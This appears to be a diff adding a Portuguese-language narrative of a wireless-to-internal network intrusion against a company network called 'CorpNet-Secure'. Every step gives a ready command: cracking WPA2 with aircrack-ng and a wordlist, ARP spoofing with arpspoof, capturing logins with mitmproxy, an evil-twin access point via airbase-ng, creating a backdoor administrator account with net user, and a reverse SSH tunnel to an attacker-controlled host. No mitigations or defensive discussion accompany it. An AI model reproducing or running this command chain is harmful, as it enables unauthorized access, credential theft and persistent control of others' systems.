@@ -1,0 +1,16 @@
+Durante o reconhecimento externo, o atacante utilizou ferramentas públicas e bases técnicas para mapear a infraestrutura da empresa, incluindo redes sem fio próximas ao perímetro físico do escritório. Após capturar pacotes de beacon e handshake de uma rede corporativa chamada CorpNet‑Secure, o atacante executou o comando aircrack‑ng capture.cap -w /usr/share/wordlists/rockyou.txt para tentar quebrar a chave WPA2.
+
+Com sucesso na quebra da senha “Corp2023!”, o invasor conectou‑se à rede interna da empresa utilizando uma interface sem fio configurada em modo monitor. Em seguida, foi iniciado o processo de mapeamento de hosts conectados com o comando netdiscover -r 192.168.0.0/24, identificando diversos dispositivos e estações pertencentes ao domínio corporativo.
+
+Para obter credenciais, o atacante posicionou‑se como intermediário na comunicação entre a estação de um colaborador e o roteador, utilizando o ataque de spoofing ARP. As ferramentas utilizadas foram arpspoof -i wlan0 -t 192.168.0.45 192.168.0.1 e arpspoof -i wlan0 -t 192.168.0.1 192.168.0.45, redirecionando o tráfego de rede através de sua máquina.
+
+Com o tráfego redirecionado, foi iniciada a captura de pacotes com o comando wireshark e filtros aplicados para interceptar logins e sessões HTTP não criptografadas. Diversos pacotes continham cookies de sessão e credenciais em texto claro. Além disso, o atacante configurou um proxy transparente utilizando mitmproxy --mode transparent --showhost para capturar autenticações de aplicações web internas.
+
+Durante a interceptação, o invasor capturou credenciais de um usuário administrativo autenticando‑se no portal interno, incluindo login e senha transmitidos via HTTP básico. Em posse dessas credenciais, foi possível realizar login em um painel de administração exposto na rede interna, permitindo acesso a servidores de arquivo e informações sensíveis.
+
+Em seguida, o atacante configurou um servidor malicioso com o mesmo SSID da rede legítima (CorpNet‑Secure) para realizar um ataque de rogue AP. Utilizou‑se o comando airbase‑ng -e CorpNet‑Secure wlan1, induzindo dispositivos próximos a conectarem‑se automaticamente. Essa técnica possibilitou a coleta de novas credenciais e tokens de autenticação de dispositivos móveis da empresa.
+
+Após consolidar o acesso, o atacante criou uma conta persistente para acesso remoto utilizando o comando net user auditadmin Password123! /add e adicionou o usuário ao grupo de administradores locais com net localgroup administrators auditadmin /add, garantindo persistência no ambiente.
+
+Por fim, foi configurado um túnel reverso seguro com o comando ssh -R 8080:localhost:22 attacker@remote-server.net
+, permitindo o controle contínuo da máquina comprometida sem depender da conexão Wi‑Fi inicial.
